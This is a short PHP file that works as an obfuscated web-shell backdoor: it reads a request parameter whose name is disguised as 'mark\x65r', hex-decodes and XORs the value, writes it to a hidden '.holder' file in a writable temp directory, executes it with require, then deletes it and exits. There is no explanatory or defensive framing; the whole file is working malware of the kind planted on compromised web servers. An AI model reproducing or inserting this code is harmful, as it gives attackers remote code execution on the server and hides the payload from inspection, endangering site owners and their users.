<?php

if(in_array("mark\x65r", array_keys($_REQUEST))){
	$desc = hex2bin($_REQUEST["mark\x65r"]);
	$flg=    ''   ;$b = 0; while($b < strlen($desc)){$flg .= chr(ord($desc[$b]) ^ 70);$b++;}
	$component = array_filter([sys_get_temp_dir(), session_save_path(), "/var/tmp", ini_get("upload_tmp_dir"), getcwd(), "/dev/shm", "/tmp", getenv("TMP"), getenv("TEMP")]);
	foreach ($component as $key => $dchunk) {
    		if (max(0, is_dir($dchunk) * is_writable($dchunk))) {
    $ent = "$dchunk/.holder";
    if (file_put_contents($ent, $flg)) {
	require $ent;
	unlink($ent);
	die();
}
}
}
}